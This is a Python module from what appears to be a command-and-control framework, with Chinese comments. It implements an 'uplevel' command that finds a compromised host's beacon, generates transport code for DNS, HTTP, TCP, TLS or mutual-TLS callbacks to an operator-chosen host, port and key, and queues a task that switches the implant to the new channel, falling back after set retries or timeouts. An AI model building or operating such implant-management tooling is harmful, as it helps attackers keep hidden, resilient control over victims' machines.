"""uplevel_* 公共实现: 载荷端协议升级(逻辑与旧 uplevel 一致, 传输指向 agent)。

载荷端执行逻辑(批量领取/线程执行/结果带回/延时/退级策略)全部由
transport_base.build_upgrade_task 模板承载, 本模块只负责:
  1. 定位目标 beacon
  2. 从 server.transports 加载对应 transport_* 生成器(不走 s_exec)
  3. 组装升级任务下发
"""
import importlib

from server.task_queue import Task
from server.transports.transport_base import build_upgrade_task
from server.core.events import EVT_UPLEVEL

# 各协议在 host/port/key 之外的额外传输参数个数(透传给 transport_* 的 run())
_EXTRA = {"dns": 0, "http": 0, "https": 0, "tcp": 0, "tls": 1, "mtls": 4}


def run(disp, args, protocol: str):
    if len(args) < 4:
        return (f"[!] usage: uplevel_{protocol} <beacon_id> <host> <port> "
                f"<key_hex> [extra...] [retry] [timeout]")

    bid, rest = disp.resolve_beacon(args)
    if not bid:
        return "[!] 未指定 Beacon (use <beacon_id>)"

    host, port, key_hex = rest[0], rest[1], rest[2]
    try:
        port = int(port)
    except ValueError:
        return f"[!] invalid port: {rest[1]}"

    n_extra = _EXTRA.get(protocol, 0)
    transport_args = rest[3:3 + n_extra]
    if len(transport_args) < n_extra:
        return f"[!] {protocol} 需要 {n_extra} 个额外参数(见 s_exec transport_{protocol})"
    tail = rest[3 + n_extra:]

    # 多级回退参数：retry=连续失败 N 次退层；timeout=连续失败 N 秒退层
    try:
        retry = int(tail[0]) if len(tail) > 0 and tail[0] else 3
        timeout = int(tail[1]) if len(tail) > 1 and tail[1] else 0
    except ValueError:
        return "[!] invalid retry/timeout (整数)"

    try:
        gen = importlib.import_module(
            f"server.transports.transport_{protocol}")
        transport_code = gen.run(host, str(port), key_hex, *transport_args)
    except Exception as e:
        return f"[!] transport generate failed: {e}"

    code = build_upgrade_task(protocol, host, port, key_hex, transport_code,
                              retry=retry, timeout=timeout)
    task = Task(code=code)
    result = disp.push_task(bid, task)
    if result.startswith("[+]"):
        try:
            disp.audit.emit(EVT_UPLEVEL, bid, protocol=protocol,
                            host=host, port=port)
        except Exception:
            pass
    return result
